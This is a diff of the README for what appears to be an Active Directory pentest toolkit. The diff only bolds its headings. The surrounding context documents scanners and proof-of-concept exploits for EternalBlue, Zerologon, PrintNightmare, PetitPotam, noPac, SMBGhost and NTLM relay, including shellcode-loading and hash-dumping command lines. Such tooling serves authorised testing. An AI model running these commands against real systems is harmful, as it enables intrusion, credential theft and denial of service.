@@ -91,7 +91,7 @@ The script can be used via Python import (ex: import SCANNER.bluegate_cve2020061
 ### Usage of scanners tools <a name="usage-scanners"/>
 **[ALL SCANNERS USAGE ARE DETAILED INTO SCANNER/00.LIST_SCANNER_GITHUB.txt]**
 
-1) BlueGate (CVE-20200610) 
+**1) BlueGate (CVE-20200610)**
 ```sh 
 python3 SCANNER/bluegate_cve20200610_scanner.py  -h
 usage: bluegate_cve20200610_scanner.py [-h] -M {check} [-P PORT] host
@@ -109,7 +109,7 @@ example(s):
 python3 SCANNER/bluegate_cve20200610_scanner.py -M check -P $PORT $IP
 ```
 
-2) EternalBlue (or MS17-010) 
+**2) EternalBlue (or MS17-010)**
 ```sh 
 python3 SCANNER/eternalblue_ms17010_scanner.py -h
 usage: eternalblue_ms17010_scanner.py [-h] [-target-ip ip address] [-port [destination port]] target
@@ -131,7 +131,7 @@ python3 SCANNER/eternalblue_ms17010_scanner.py -p "$TARGET_PORT" "$TARGET_IP"
 python3 SCANNER/eternalblue_ms17010_scanner.py -p "$TARGET_PORT" "$DOMAIN_NAME"/"$DOMAIN_USERNAME":"$DOMAIN_PWD"@"$TARGET_IP"
 ```
 
-3) GPP Abuse 
+**3) GPP Abuse**
 ```sh
 python3 SCANNER/getgppcreds_scanner.py  -h
 usage: getgppcreds_scanner.py [-h] [-share SHARE] [-base-dir BASE_DIR] [-ts] [-debug] [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-dc-ip ip address] [-target-ip ip address]
@@ -170,7 +170,7 @@ example(s):
 - python3 getgppcreds_scanner.py "$DOMAIN_NAME"/"$USERNAME"@"$DC_IP" -hashes "$NTLM_HASH"
 ```
 
-4) MIC Remove Attack (or CVE-2019-1040)
+**4) MIC Remove Attack (or CVE-2019-1040)**
 ```sh
 python3 SCANNER/micRA_cve20191040_scanner.py -h
 usage: micRA_cve20191040_scanner.py [-h] [-port [destination port]] [-hashes LMHASH:NTHASH] target
@@ -195,7 +195,7 @@ example(s):
 - python3 micRA_cve20191040_scanner.py -port "$PORT" "$DOMAIN_NAME"/"$USERNAME":"$PASSWORD"@"$TARGET_IP"
 ```
 
-5) NetApi (or CVE-20084250)
+**5) NetApi (or CVE-20084250)**
 ```sh
 python3 SCANNER/netapi_cve20084250_scanner.py -h
 Usage: SCANNER/netapi_cve20084250_scanner.py target_ip port
@@ -204,7 +204,7 @@ example(s):
 - python3 netapi_cve20084250_scanner.py "$TARGET_IP" "$PORT"
 ```
 
-6) PetitPotam
+**6) PetitPotam**
 ```sh
 python3 SCANNER/petitpotam_scanner.py 
 Usage: SCANNER/petitpotam_scanner.py target_ip port domain username password ntlmhash
@@ -213,7 +213,7 @@ example(s):
 - python3 petitpotam_scanner.py "$TARGET_IP" "$TARGET_PORT" "$domain_name" "$USERNAME" "$PASSWORD" "$NTLM_HASH"
 ```
 
-7) PrintNightmare (or CVE-2021-1675)
+**7) PrintNightmare (or CVE-2021-1675)**
 ```sh
 python3 SCANNER/printnightmare_cve20211675_scanner.py  -h
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
@@ -260,7 +260,8 @@ example(s):
 - python3 printnightmare_cve20211675_scanner.py -check "$USERNAME":"$PASSWORD"@"$TARGET_IP"
 - python3 printnightmare_cve20211675_scanner.py -check "$USERNAME"@"$TARGET_IP" -hashes "$NTLM_HASH"
 ```
-8) PrintSpooler 
+
+**8) PrintSpooler**
 ```sh
 python3 SCANNER/rpcdump_scanner.py -h
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
@@ -291,7 +292,7 @@ example(s):
 
 ```
 
-9) sAMAccountName (or CVE-2021-42278)
+**9) sAMAccountName (or CVE-2021-42278)**
 ```sh
 python3 SCANNER/sAMAccountName_cve202142278_scanner.py 
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
@@ -345,7 +346,7 @@ example(s):
 - python3 sAMAccountName_cve-2021-42278_scanner.py -dc-host "$DC_HOSTNAME" -scan "$DOMAIN_NAME"/"$USERNAME" -hashes "$NTLM_HASH"
 ```
 
-10) SMBGhost (or CVE-2020-0796)
+**10) SMBGhost (or CVE-2020-0796)**
 ```sh
 python3 SCANNER/smbghost_cve20200796_scanner.py -h
 Usage: SCANNER/smbghost_cve20200796_scanner.py target_ip port
@@ -354,7 +355,7 @@ example(s):
 - python3 smbghost_cve20200796_scanner.py $TARGET_IP $PORT 
 ```
 
-11) SMBleed (or CVE-2020-1206)
+**11) SMBleed (or CVE-2020-1206)**
 ```sh
 python3 SCANNER/smbleed_cve20201206_scanner.py -h
 Usage: SCANNER/smbleed_cve20201206_scanner.py target_ip port
@@ -363,7 +364,7 @@ example(s):
 - python3 smbleed_cve20201206_scanner.py $TARGET_IP $PORT 
 ```
 
-12) SMB Signing 
+**12) SMB Signing**
 ```sh
 python3 SCANNER/smbsigning_scanner.py -h
 Usage: SCANNER/smbsigning_scanner.py target_ip port
@@ -372,7 +373,7 @@ example(s):
 - python3 smbsigning_scanner.py $TARGET_IP $PORT
 ```
 
-13) Zerologon (or CVE-2020-1472)
+**13) Zerologon (or CVE-2020-1472)**
 ```sh
 python3 SCANNER/zerologon_cve20201472_scanner.py -h
 Usage: zerologon_tester.py <dc-name> <dc-ip>
@@ -388,7 +389,7 @@ example(s):
 ### Usage of PoC tools <a name="usage-poc"/>
 **[ALL POC USAGE ARE DETAILED INTO POC/00.LIST_POC_GITHUB.txt]**
 
-1) BlueGate (CVE-20200610) 
+**1) BlueGate (CVE-20200610)**
 ```sh 
 python3 POC/bluegate_cve20200610_poc.py -h
 usage: bluegate_cve20200610_poc.py [-h] -M {dos} [-P PORT] host
@@ -406,7 +407,7 @@ example(s):
 - python3 bluegate_cve20200610.py -M dos -P $TARGET_PORT $TARGET_IP
 ```
 
-2) EternalBlue (or MS17-010) 
+**2) EternalBlue (or MS17-010)**
 ```sh 
 python3 POC/eternalblue_ms17010_poc.py 
 POC/eternalblue_ms17010_poc.py <ip> <shellcode_file> [numGroomConn]
@@ -420,7 +421,7 @@ example(s):
 - python3 eternalblue_ms17010_poc.py $TARGET_IP $FILEPATH 13 
 ```
 
-3) GPP Abuse 
+**3) GPP Abuse**
 ```sh
 [SAME SCRIPT AS SCANNER/]
 example(s):
@@ -428,7 +429,7 @@ example(s):
 - python3 getgppcreds_scanner.py "$DOMAIN_NAME"/"$USERNAME":"$PASSWORD"@"$DC_IP"
 ```
 
-4) MIC Remove Attack (or CVE-2019-1040)
+**4) MIC Remove Attack (or CVE-2019-1040)**
 ```sh
 [STILL NOT IMPLEMENTED]
 example(s):
@@ -436,8 +437,7 @@ example(s):
 - python CVE-2019-1040.py -ah attackterip -u user --hashes userhash -d domain.com -th DCip MailServerip --just-dc-user krbtgt
 ```
 
-
-5) NetApi (or CVE-20084250)
+**5) NetApi (or CVE-20084250)**
 ```sh
 example(s):
 1) Generate the payload/shellcode with your listening IP and PORT
@@ -446,7 +446,8 @@ example(s):
 3) Execute the POC with the target IP, the shellcode file path, the targeted OS: 
 - python3 netapi_cve20191040_poc.py $TARGET_IP $OS $PORT $FILEPATH
 ```
-6) PetitPotam
+
+**6) PetitPotam**
 ```sh
 python3 POC/petitpotam_poc.py -h
 usage: petitpotam_poc.py [-h] [-u USERNAME] [-p PASSWORD] [-d DOMAIN] [-hashes [LMHASH]:NTHASH] [-no-pass] [-k] [-dc-ip ip address] [-target-ip ip address] [-pipe {efsr,lsarpc,samr,netlogon,lsass,all}]
@@ -526,14 +527,15 @@ example(s):
 - python3 CVE-2021-1675.py -v -u $USERNAME -p $PASSWORD -d $DOMAIN -dll $NAME_DLL.dll --local-ip $MY_IP $TARGET_IP
 ```
 
-8) PrintSpooler 
+**8) PrintSpooler**
 ```sh
 
 example(s):
 
 
 ```
-9) sAMAccountName (or CVE-2021-42278)
+
+**9) sAMAccountName (or CVE-2021-42278)**
 ```sh
 python3 POC/sAMAccountName_cve202142278_poc.py -h
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
@@ -594,7 +596,7 @@ example(s):
 - python noPac.py cgdomain.com/sanfeng:'1qaz@WSX' -dc-ip 10.211.55.203 -dc-host lab2012 --impersonate administrator -dump (to dump the hashes)
 ```
 
-10) SMBGhost (or CVE-2020-0796)
+**10) SMBGhost (or CVE-2020-0796)**
 ```sh
 python3 POC/smbghost_cve20200796_poc.py -h
 usage: smbghost_cve20200796_poc.py [-h] -ip IP [-p PORT] -f FILEPATH
@@ -615,14 +617,14 @@ example(s):
 - python3 smbghost_cve20200796_poc.py -ip $TARGET_IP -p $TARGET_PORT -f $FILEPATH_TO_SHELLCODE
 ```
 
-11) SMBleed (or CVE-2020-1206)
+**11) SMBleed (or CVE-2020-1206)**
 ```sh
 
 example(s):
 
 
 ```
-12) SMB Signing 
+**12) SMB Signing**
 ```sh
 python3 POC/ntlmrelayx.py -h
 Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation
@@ -644,7 +646,7 @@ example(s):
 - ntlmrelayx.py -t $IP -l loot
 ```
 
-13) Zerologon (or CVE-2020-1472)
+**13) Zerologon (or CVE-2020-1472)**
 ```sh
 python3 POC/zerologon_cve20201472_poc.py -h
 Usage: zerologon_tester.py <dc-name> <dc-ip>
